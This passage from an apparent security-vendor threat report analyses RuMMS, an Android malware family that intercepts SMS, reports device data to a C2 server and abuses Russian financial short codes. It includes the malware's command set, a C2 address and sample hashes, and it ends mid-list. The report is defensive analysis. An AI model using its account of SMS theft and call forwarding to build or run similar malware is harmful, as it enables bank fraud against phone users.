 <p>Use of a shared hosting service to distribute malware is highly
  flexible and low cost for the threat actors. It is also much harder
  for network defenders or researchers to track a campaign where the
  infrastructure is a moving target. Many top providers in Russia offer
  cheap prices for their shared hosting services, and some even provide
  free 30-day trial periods. Threat actors can register subdomains
  through the hosting provider and use the provider’s services for a
  short-period campaign. A few days later they can cancel the trial and
  do not need to pay a penny. In addition, these out-of-the-box hosting
  services usually provide better infrastructure than the attackers
  could manage to construct (or compromise) themselves.</p>
 <h5>
  <b>RuMMS Code Analysis</b></h5>
 <p>All RuMMS samples share the same behaviors, major parts of which are
  shown in Figure 1. However, the underlying code can be quite different
  in that various obfuscation mechanisms were adopted to evade detection
  by anti-virus tools. We used a sample app named “org.starsizew” with
  an MD5 of d8caad151e07025fdbf5f3c26e3ceaff to analyze RuMMS’s code.</p>
 <p>Several of the main components of RuMMS are shown in Figure 2. The
  activity class “org.starsizew.MainActivity” executes when the app is
  started. It first starts another activity defined in
  “org.starsizew.Aa” to request device administrator privileges, and
  then calls the following API of “android.content.pm.PackageManager”
  (the Android package manager to remove its own icon on the home screen
  in order to conceal the existence of RuMMS from the user:</p>
 <p>            setComponentEnabledSetting(MainActivity.<i>class, 2, 1</i>)</p>
 <p>At the same time, ”org.starsizew.MainActivity” will start the main
  service as defined in “org.starsizew.Tb”, and use a few mechanisms to
  keep the main service running continuously in the background. The
  class “org.starsizew.Ac” is designed for this purpose; its only task
  is to check if the main service is running, and restart the main
  service if the answer is no. The class “org.starsizew.Tb” also has a
  self-monitoring mechanism to restart itself when its own
  <i>onDestroy</i> API is triggered. Other than that, its major
  functionality is to collect private device information, upload it to a
  remote C2 server, and handle any commands as requested by the C2
  server. All those functions are implemented in asynchronous tasks by “org.starsizew.i”.</p>
 <p>
  <span class=""type-XS"">Figure 2. Android Manifest File of RuMMS</span></p>
 <p>The class “org.starsizew.Ma” is registered to intercept incoming SMS
  messages, the arrival of which will trigger the Android system to call
  its “<i>onReceive</i>” API. Its major functionality is also
  implemented through the call of the asynchronous task
  (“org.starsizew.i”), including uploading the incoming SMS messages to
  the remote C2 server and executing any commands as instructed by the
  remote attacker.</p>
 <h5>
  <b>C2 Communication</b></h5>
 <p>The C2 communication includes two parts: sending information to the
  remote HTTP server and parsing the server’s response to execute any
  commands as instructed by the remote attackers. The functionality for
  these two parts is implemented by <i>doInBackground</i> and
  <i>onPostExecute</i> respectively, two API methods of
  “android.os.AsyncTask” as extended by class “org.starsizew.i”.</p>
 <p></p>
 <p>
  <span class=""type-XS"">Figure 3. Method doInBackground: to send
    information to remote C2 server</span></p>
 <p>As seen from the major code body of method <i>doInBackground</i>
  shown in Figure 3 (some of the original classes and methods are
  renamed for easier understanding), there are three calls to
    <i>HttpPost </i>with different contents as parameters. At line 5,
  local variable <i>v4</i> specifies the first parameter <i>url</i>,
  which can be changed by the remote C2 server later. These URLs are all
  in the form of “http://$C2.$SERVER.$IP/api/?id=$NUM”. The second
  parameter is a constant string “POST”, and the third parameter is a
  series of key-value pairs to be sent, assembled at runtime. The value
  of the first item, whose key is “method” (line 7), indicates the type
  of the contents: install, info and sms.</p>
 <p>The first type of content, starting with “method=install”, will be
  sent when the app is started for the first time, including the
  following device private information:</p>
 <ul> <li>Victim identifier</li> <li>Network operator</li> <li>Device
  model</li> <li>Device OS version</li> <li>Phone number</li> <li>Device
  identifier</li> <li>App version</li> <li>Country</li> </ul>
 <p>Figure 4 is an example of this string as seen by the FireEye Mobile
  Threat Prevention platform.</p>
 <p></p>
 <p>
  <span class=""type-XS"">Figure 4. Example HTTP post message</span></p>
 <p>The second type of information will be sent periodically to indicate
  that the device is alive. It only has two parts, the method indicated
  by word “info” and the victim identifier. The third type of
  information will be sent when RuMMS intercepts any SMS messages,
  including the balance inquiry results when it contacts the SMS code of
  a particular financial service.</p>
 <p>Method <i>onPostExecute</i> parses the response from the above HTTP
  session and executes the commands provided by the remote attacker. As
  seen from the code in Figure 5, the commands RuMMS supports right now include:</p>
 <ul> <li>install_true: to modify app preference to indicate that the C2
    server received the victim device’s status.</li> <li>sms_send: to
    send C2-specified SMS messages to C2-specified recipients.</li>
    <li>sms_grab: to upload periodically the SMS messages in the inbox
    to C2 server.</li> <li>delivery: to deliver specified text to all
    victim’s contacts (SMS worming).</li> <li>call_number: to forward
    phone calls to intercept voice based two-factor authentication.</li>
    <li>new_url: to change the URL of the C2 server in the app
  preference.</li> <li>ussd: to call a C2-specified phone number.</li> </ul>
 <p></p>
 <p>
  <span class=""type-XS"">Figure 5. Method onPostExecute: to handle
    instructions from remote C2</span></p>
 <p>Figure 6 shows an example response sent back from one C2 server.
  Note that inside this single response, there is one “install_true”
  command, one “sms_grab” command and four “sms_send” commands. With the
  four “sms_send” commands, the messages as specified in the key “text”
  will be sent immediately to the specified short numbers. Our analysis
  suggests that the four short numbers are associated with Russian
  financial institutions, presumably where a victim would be likely to
  have accounts.</p>
 <p></p>
 <p>
  <span class=""type-XS"">Figure 6. Example Response in JSON format</span></p>
 <p>In particular, short number “+7494” is associated with a payment
  service provider in Russia. The provider’s website described how the
  code 7494 can be used to provide a series of payment-related
  capabilities. For example, sending text “Balance” will trigger a
  response with the victim’s wallet balance. Sending text “confirm 1”
  will include proof of payment. Sending text “call on” will activate
  the USSD payment confirmation service.</p>
 <p>During our investigation, we observed the C2 server sending multiple
  “balance” commands to different institutions, presumably to query the
  victim’s financial account balances. RuMMS can upload responses to the
  balance inquiries (received via SMS message) to the remote C2 server,
  which can send back additional commands to be sent from the victim to
  the provider’s payment service. These could include resetting the
  user’s PIN, enabling or disabling various alerts and confirmations,
  and confirming the user’s identity.</p>
 <h5>
  <b>RuMMS Samples, C2, Hosting Sites, Infections and Timeline</b></h5>
 <p>In total we captured 297 RuMMS samples, all of which attempt to
  contact an initial C2 server that we extracted from the app package.
  Figure 7 lists the IP addresses of these C2 servers, the number of
  RuMMS apps that connect to each of them, and the example URL used as
  the first parameter of the HttpPost operation (used in the code of
  Figure 3). This indicates that multiple C2 servers were used in this
  campaign, but one (37.1.207.31) was the most heavily used.</p>
 <p>Figure 7. RuMMS samples and C2 servers</p>
 <p>Figure 8 shows how these samples, C2 servers and hosting websites
  are related to each other, including when they were compiled or
  observed. In the quadrant, the smaller boxes in blue-gray represent
  particular apps in the RuMMS family, while the bigger boxes in
  deep-blue represent C2 servers used by some RuMMS apps. The dotted
  arrows represent the use of a particular C2 server by a specific app
  to send information and fetch instructions. In this figure we have 11
  RuMMS samples, all of which were hosted on the website as shown in the
  “y” axis. The dates on the “x” axis show the dates when we first saw
  these apps in the wild. This figure demonstrates the following
  interesting information:</p>
 <p>The time range when threat actors distributed RuMMS on those
  shared-hosting websites is from January 2016 to March 2016.</p>
 <ul> <li>Threat actors used different websites to host different
    payloads at different times. This kind of “moving target” behavior
    made it harder to track their actions.</li> <li>The same websites
    have hosted different RuMMS samples at different dates.</li> <li>C2
    servers are shared by multiple samples. This matches our
    observations of C2 servers as shown in Figure 7.</li> </ul>
 <p></p>
 <p>
  <span class=""type-XS"">Figure 8. RuMMS samples, hosting sites, C2
    servers from Jan. 2016 to Mar. 2016</span></p>
 <p>We do not know exactly how many people have been infected with RuMMS
  malware; however, our data suggests that there are at least 2,729
  infections with RuMMS samples from January 2016 to early April 2016.</p>
 <p>Figure 9 shows the number of RuMMS infections recorded in the last
  four months. When we first observed the malware in January, we
  recorded 380 infections. In February, we recorded 767 infections. In
  March, it peaked at 1,169 infections. In April, at the time of writing
  this post, we recorded 413 RuMMS infections. Although the propagation
  trend seems to be slowing down a bit, the figure tells us that RuMMS
  malware is still alive in the wild. We continue to monitor its progress.</p>
 <p></p>
 <p> </p>
 <p>
  <span class=""type-XS"">Figure 9. RuMMS infections from Jan. 2016 to
    Apr. 15, 2016</span></p>
 <h5>
  <b>Conclusion</b></h5>
 <p>Smishing (SMS phishing) offers a unique vector to infect mobile
  users. The recent RuMMS campaign shows that Smishing is still a
  popular means for threat actors to distribute their malware. In
  addition, the use of shared-hosting providers adds flexibility to the
  threat actor’s campaign and makes it harder for defending parties to
  track these moving targets.</p>
 <p>Fortunately, FireEye Mobile Threat Prevention platform can recognize
  the malicious SMS and networking behaviors used by these RuMMS
  samples, and help us quickly identify the threat. To protect yourself
  from these threats, FireEye suggests that users:</p>
 <ul> <li>Take caution before clicking any links where you are not sure
    about the origin.</li> <li>Don’t install apps outside the official
    app store.</li> </ul>
 <p>To detect and defend against such attacks, we advise our customers
  to deploy our mobile security solution, FireEye MTP/MSM. This helps
  our clients gain visibility into threats in their user base, and also
  enables them to proactively hunt down devices that have been
  compromised. In addition, we advise our customers with NX appliances
  to ensure that Wi-Fi traffic is scanned by NX appliances to extend
  coverage to mobile devices.</p>
 <h5>
  <b>Appendix: RuMMS Sample Hashes</b></h5>
 <table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""200""> <tbody>
    <tr>
      <td width=""200""><p>016410e442f651d43a7e28f72be2e2ef</p> </td> </tr>
    <tr>
      <td width=""200""><p> 01d95061091d4f6f536bada821461c07</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0328121ca8e0e677bba5f18ba193371c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 03a442b0f7c26ef13a928c7f1e65aa23</p> </td> </tr>
    <tr>
      <td width=""200""><p> 03c85cb479fd9031504bba04c2cefc96</p> </td> </tr>
    <tr>
      <td width=""200""><p> 053c247a1c176af8c9e42fe93fb47c9d</p> </td> </tr>
    <tr>
      <td width=""200""><p> 064799b5c74a5bae5416d03cf5ff4202</p> </td> </tr>
    <tr>
      <td width=""200""><p> 066e171fc083c5e21ac58026870a4ae8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0749e775f963fdab30583914f01486e3</p> </td> </tr>
    <tr>
      <td width=""200""><p> 081b04697f96568356d7b21ac946fb7c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0927b599d9599dcd13b6ef5f899ef4d9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0964ee11f6d19c2297bce3cb484a2459</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0a22ceac6a0ee242ace454a39bff5e18</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0a3b9c27b539498b46e93dbdcfb3de1e</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0abf7a57855c2312661fdc2b6245eef8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0c3dbcffb91d154b2b320b2fce972f39</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0c75764d172364c239fc22c9c3e21275</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0dd1d8d348a3de7ed419da54ae878d37</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0dd40d2f4c90aec333445112fb333c88</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0e89415cdd06656d03ef498fd1dd5e9b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0e8ef8108418ca0547b195335ee1dd2c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0ea83ffc776389a19047947aba5b4324</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0f280e86268da04dc2aa65b03f440c1a</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0f5a6b34e952c5c44aa6f4a5538a6f2b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 0fa1ffbcfe0afc6a4a57fed513a72eb6</p> </td> </tr>
    <tr>
      <td width=""200""><p> 104859f80028792fbd3a0a0ea1e6fd78</p> </td> </tr>
    <tr>
      <td width=""200""><p> 10c58dd41d95a81b1043059563860c1c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 11d425602d3c8311d1e18df35db1daa3</p> </td> </tr>
    <tr>
      <td width=""200""><p> 120561bfced94cc1ce5cda03b203dbf8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 128576fbdb7d2980c5a52cd3286bcca8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 14a8246474ed819a4dfcc3cb06e98954</p> </td> </tr>
    <tr>
      <td width=""200""><p> 14c7f0dc55b5dd0c7e39f455baae3089</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1693f424742279a8678322a012222a02</p> </td> </tr>
    <tr>
      <td width=""200""><p> 16b778921b6db27a2af23dd8ce1fac3e</p> </td> </tr>
    <tr>
      <td width=""200""><p> 16ec62c1d7d4ac3f3d7d743fc1e21bf6</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1711081b5ba5c3941ae01d80819c7530</p> </td> </tr>
    <tr>
      <td width=""200""><p> 177af9700bcc8b7c8c131b662e8cdda8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 17bfe26e9a767c83df2aab368085e3c2</p> </td> </tr>
    <tr>
      <td width=""200""><p> 17d083988dd5e6d9c2517899ae30bb02</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1850c020edafcf8254279e352ce33da9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 18d1b845b2ee1960b304ab2fd3bfe11b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1b4b6bf1e40d5954b34a815d1438efd9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1cbedd5cc8e9b59f90ec81a5aec0239f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1cead79dfdaee9d7eb914a5b13a323ea</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1dc8e18e610fd921ffa638b3f51de4b2</p> </td> </tr>
    <tr>
      <td width=""200""><p> 1ed3c0158eb960bb47847596a69a744c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2177a3094dd06f9d777db64364d3fc2c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 220fc807884acfcd703596994e202f21</p> </td> </tr>
    <tr>
      <td width=""200""><p> 244b965d3816ac828d21c04bcf0519a4</p> </td> </tr>
    <tr>
      <td width=""200""><p> 24f23fe808ba3f90a7a48eae37ce259d</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2745bc6f165ae43f1edf5cd1e01db2c5</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2802552e2aa5491ebbf28bfef85618cb</p> </td> </tr>
    <tr>
      <td width=""200""><p> 29a8eef1b304d53f303d03ba6994ed32</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2a1c02bd4263a4e1cb6f648a9da59429</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2a6c086c589d1b0a7d6d81c4e4c70282</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2ac5e8e2fd8050330863875d5018cb59</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2c200cfcc5f4121fb70b1c152357225b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2cb75f46b901c17b2f0a9cb486933d65</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2cd1908f4846e81e92f82684d337e858</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2ce248b19c30a9fed4cd813c23831d7a</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2cf5b053bf51e9ff8ea653da5523b5f1</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2e44ffbaa24c1203df218be1cc28a9e5</p> </td> </tr>
    <tr>
      <td width=""200""><p> 2e9fcd26fdeeed19f0de865298d59f2e</p> </td> </tr>
    <tr>
      <td width=""200""><p> 308bec5d52d55c00aff0b561e7975bdf</p> </td> </tr>
    <tr>
      <td width=""200""><p> 30a8c03a7d6a489da047443938e2aa20</p> </td> </tr>
    <tr>
      <td width=""200""><p> 30c1a1a7417598fa8f23572f0f090866</p> </td> </tr>
    <tr>
      <td width=""200""><p> 30f2b0edd191d1465bac11553d60f761</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3103bd49786d52c920e12303921bd2f1</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3131d58ace4f3485dcc2581be3fcfb42</p> </td> </tr>
    <tr>
      <td width=""200""><p> 315a713c65baf5390fcf4232df3d1669</p> </td> </tr>
    <tr>
      <td width=""200""><p> 318513f9f14fbf78ec037b62b221c91b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3199b7e9b27c1aa619bc6959c6eab458</p> </td> </tr>
    <tr>
      <td width=""200""><p> 31eddefcadb1d4a6bbc55e610d085638</p> </td> </tr>
    <tr>
      <td width=""200""><p> 34788c0c80687e1488d3c9b688de9991</p> </td> </tr>
    <tr>
      <td width=""200""><p> 34e8dfc3d5fe5a936d556ac79e53412f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 356393e8c85864fa2e31e30d28c13067</p> </td> </tr>
    <tr>
      <td width=""200""><p> 35666c9ef8d3d81d8641578259982e57</p> </td> </tr>
    <tr>
      <td width=""200""><p> 37506bcd79e0a39d56edda2f0713ce34</p> </td> </tr>
    <tr>
      <td width=""200""><p> 38b9c800c9787ea6de3f5a9436444435</p> </td> </tr>
    <tr>
      <td width=""200""><p> 391a74f46c7f7c34e98be38228fc94b6</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3a0baa509a54359d10696d995dfe783e</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3abe743871688eb542a36bdd4f5ba196</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3b2dda7dafbc3f690f179999b367f743</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3b39743b98e7223c93f15026c009e2ed</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3d3dac2656f5850d6e2cababc06edd23</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3d4e135e647fba30e67415e5ebc5af42</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3de3c1ff2db0f75d18c10c1d682596a6</p> </td> </tr>
    <tr>
      <td width=""200""><p> 3f9376bd042b5c9b111dde1b460ab9b5</p> </td> </tr>
    <tr>
      <td width=""200""><p> 40f7cec380c6904bbeaac5c42bc99fb6</p> </td> </tr>
    <tr>
      <td width=""200""><p> 412e4f59e3a7a7d870581e83bffa33d1</p> </td> </tr>
    <tr>
      <td width=""200""><p> 41b946bf78606d4f94a7206f024914bf</p> </td> </tr>
    <tr>
      <td width=""200""><p> 422fc3634a8a575945fc96bd85465275</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4294589c588b577529150b01ce588a13</p> </td> </tr>
    <tr>
      <td width=""200""><p> 437db1d8d84e245875064ba7cccc9ae0</p> </td> </tr>
    <tr>
      <td width=""200""><p> 44a56e288d906cbfec85f6715554f83b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 472187a7eba0fd0479130711df34a409</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4827e46a2382fdfa2847db0d376c2c52</p> </td> </tr>
    <tr>
      <td width=""200""><p> 48378433f79ac304d0bb86ee6f99958e</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4841a521f95ea744243566cc69904bd1</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4aa78398d9a927d2c67bf6a5fb0c8db8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4b478ad35ad285ff4ff2623cb8c63ff7</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4be9cb7e3cdab4766411a0d2506a2cf7</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4d7ce984313b06835b72a4e6ad6e61fa</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4e60269982182b1cb8139dd5159a6b78</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4ed59658844835a222e09c6ca5701bf8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4eda51773b46975d47b8932fee4cd168</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4f837a3eee0a228c1c7cb13916f14fe8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4fad9557973f3451be04efbbf9f51b8d</p> </td> </tr>
    <tr>
      <td width=""200""><p> 4faefac63b3876604945f11effc6042a</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5044a06f037118627899abd1229895fe</p> </td> </tr>
    <tr>
      <td width=""200""><p> 50aa9c662a508c9a9bda508bbb5b4ac7</p> </td> </tr>
    <tr>
      <td width=""200""><p> 50cccf3ee065977de3a2c07249313411</p> </td> </tr>
    <tr>
      <td width=""200""><p> 512c580db356e18c51b051a7b04fa0c1</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5144790d272daacc7210fc9e2ae41f12</p> </td> </tr>
    <tr>
      <td width=""200""><p> 516d74358ef2f61fbb90e9d1a17f59f9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 52c5cc858d528fd0554ef800d16e0f8f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 53281564e50a8dfab1d7d068f5f3bae3</p> </td> </tr>
    <tr>
      <td width=""200""><p> 53baf60ae4611b844e54a600f05c9bbf</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5510c69693819baf9ad2e4a346f805b0</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5527ffe6768f3b61d69ee83039f6e487</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5678e4c2cfe9c2bd25cde662b026550e</p> </td> </tr>
    <tr>
      <td width=""200""><p> 56d95aa243571ccd85b516d0f393ed37</p> </td> </tr>
    <tr>
      <td width=""200""><p> 56dedd0ca8849891486e23a53acb66ed</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5702f860032be6a67d5ead51191f90a8</p> </td> </tr>
    <tr>
      <td width=""200""><p> 57343fd964265e6472e87a4f6c626763</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5814b9a4b3f10abe74b61901ee151a9f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5a95d673b2c2d758c7d456c421ba1719</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5b6c7341a08f5cd4c27f443e3c057dd1</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5b7b1c1d3102a04e88ddfe8f27ffa2f2</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5bc0678baa1f30b89b80dcc7cf4431dc</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5c318b3ba77d0052427c7bffeb02a09f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5de94bc0c4cc183c0ee5a48a7ae5ae43</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5e47b31cf973beba682c2973ed3dc787</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5e5f6b1fe260475872192d2ec3cb1462</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5e9773741a5e18672664121f8e5f4191</p> </td> </tr>
    <tr>
      <td width=""200""><p> 5f08343486e42a0f8db0c0647c8255d1</p> </td> </tr>
    <tr>
      <td width=""200""><p> 609e0b1940d034b6d222138e312c8dd2</p> </td> </tr>
    <tr>
      <td width=""200""><p> 60b89dc654ed71053466b6c1f9bec260</p> </td> </tr>
    <tr>
      <td width=""200""><p> 6148b71d713c80af2acfd3506d72a7a4</p> </td> </tr>
    <tr>
      <td width=""200""><p> 6179d744808ad893dabb7b7de6b4a488</p> </td> </tr>
    <tr>
      <td width=""200""><p> 619dade7c5a7444397b25c8e9a477e96</p> </td> </tr>
    <tr>
      <td width=""200""><p> 61e67e7f1e2644bb559902ba90e438a5</p> </td> </tr>
    <tr>
      <td width=""200""><p> 62186f41850c54a46252a7291060760d</p> </td> </tr>
    <tr>
      <td width=""200""><p> 64c2cbc4bfd487e30f7b925fbbc751b0</p> </td> </tr>
    <tr>
      <td width=""200""><p> 65eab2ed600f5ae45fe916a573ce72b0</p> </td> </tr>
    <tr>
      <td width=""200""><p> 66e9dca8bb42dd41684c961951557109</p> </td> </tr>
    <tr>
      <td width=""200""><p> 67fe7190cefc9dad506ed3c1734ff708</p> </td> </tr>
    <tr>
      <td width=""200""><p> 692989b9681f80e9051359d15ec2297f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 6ae2e0ed9ae6dca4ea1ba71ae287406c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 6de02d603b741c7a5fc949952088f567</p> </td> </tr>
    <tr>
      <td width=""200""><p> 6e2b5af3acf5306d8ac264a47193fe49</p> </td> </tr>
    <tr>
      <td width=""200""><p> 6ee8919bd388494e5694b39ae24bd484</p> </td> </tr>
    <tr>
      <td width=""200""><p> 6ef671cfdf28c7252db1c451ca37ec9a</p> </td> </tr>
    <tr>
      <td width=""200""><p> 70122f367b82c8dd489b0fafa32d0362</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7064de8a83750bd1b38c23324b3757e3</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7089021c4ac0a7f38d52206653070af9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7211a069239cb354c6029f963c2a5f06</p> </td> </tr>
    <tr>
      <td width=""200""><p> 73d14b09f12eca5af555e5d205808064</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7511ed572f555af27c47f2a02b64302d</p> </td> </tr>
    <tr>
      <td width=""200""><p> 75aab55e822bbca87f60970d37c8d7b3</p> </td> </tr>
    <tr>
      <td width=""200""><p> 75d87e15a789770c242fec0867359588</p> </td> </tr>
    <tr>
      <td width=""200""><p> 75e18289c8e9cc484e7e43ca656be24a</p> </td> </tr>
    <tr>
      <td width=""200""><p> 76546e44fe4761503cb807a8d96a6719</p> </td> </tr>
    <tr>
      <td width=""200""><p> 766084da85eab06dc639a62ff381b541</p> </td> </tr>
    <tr>
      <td width=""200""><p> 778cc7e83ad27c92f30cea519989f47b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 788f75bf8f1330ec78d5d454bf88d17f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 79736c03eeda35ab7c3b6656048c0247</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7b853f8219384485b8753a58259ad171</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7c3e5bace659e9ddf7444b744a8667e9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7d1c2d11a9b68a107ffb32c86675d8e9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7d91f480e5a0c4372a43103f678eb328</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7e0671fc66f9a482000414212bf725e3</p> </td> </tr>
    <tr>
      <td width=""200""><p> 7f79a0ccc91f654de59c361af1964354</p> </td> </tr>
    <tr>
      <td width=""200""><p> 80a80e9f0b241ab3d0d9febab34d0e56</p> </td> </tr>
    <tr>
      <td width=""200""><p> 822c9b26e833e83790433895fe7e2d3b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 836e64f3e9046e08cdf66b944718e48b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 83e4610c9500a48b8d1721c11e5797e2</p> </td> </tr>
    <tr>
      <td width=""200""><p> 84354edd9292441aeed05c548fdaed7c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 84d600d85a061fa137e4b8fc82e1de2f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 851953bee7687d96891f45f24297a50b</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8599910e19552c9aa26db7be3e04be55</p> </td> </tr>
    <tr>
      <td width=""200""><p> 859e9dbcbd0db577ff401537ae560e74</p> </td> </tr>
    <tr>
      <td width=""200""><p> 85d866a99d6b130cbdde3949c015fec4</p> </td> </tr>
    <tr>
      <td width=""200""><p> 86484d0e432e8c7e8f1b213413157138</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8895d772158f5456a80a2093aad516a2</p> </td> </tr>
    <tr>
      <td width=""200""><p> 895a3b66c76c169b02843468062b1c5d</p> </td> </tr>
    <tr>
      <td width=""200""><p> 895ef967c9ee97c5b9f3bdc426f6ad0f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 898683c4f39ad83f53f38460e170fd77</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8a0aae077c62d37ba9aeed2ad441dcf3</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8a5c4d1d946a01b56f180c930438c1e9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8b56c493375d3b65d509793751509ba5</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8ceb4223e6238955fa7e154a794d5d04</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8d7c7392767415031d9ded205f0b29ef</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8dadd1162d01911160a5dbcdf081c5ba</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8e1207efd35f03caf74fdff314368da9</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8e5e0eb98e813371653b09864d4fc76a</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8f0243b5077bdb23baa1ceeedc697ff0</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8f11770349001409163245422b8d4442</p> </td> </tr>
    <tr>
      <td width=""200""><p> 8f1fa31155a38ce3d6bc0fba43a82362</p> </td> </tr>
    <tr>
      <td width=""200""><p> 90366f0731b60cf0c9959f06509d9ff5</p> </td> </tr>
    <tr>
      <td width=""200""><p> 91a2746500d253633dd953692183fd76</p> </td> </tr>
    <tr>
      <td width=""200""><p> 91c6a4e86d72c60beef95b75f9b4be82</p> </td> </tr>
    <tr>
      <td width=""200""><p> 93323852f58c4e1b436a671651cc4998</p> </td> </tr>
    <tr>
      <td width=""200""><p> 93b8d4d9704c13d983cf99a1296259d2</p> </td> </tr>
    <tr>
      <td width=""200""><p> 940981070911dee2e2818216047d2ecb</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9461365a2bed17fb5b41536bf07ba165</p> </td> </tr>
    <tr>
      <td width=""200""><p> 95921f248cd912e301c6b04120714d1f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 960d7dfa6f9c110732c34025687d5b60</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9621369183946ebb60d9959828dd5e16</p> </td> </tr>
    <tr>
      <td width=""200""><p> 97cbd88d4414b41939571e994add3756</p> </td> </tr>
    <tr>
      <td width=""200""><p> 99236003238f8ee88b5c4c8d02fdd17d</p> </td> </tr>
    <tr>
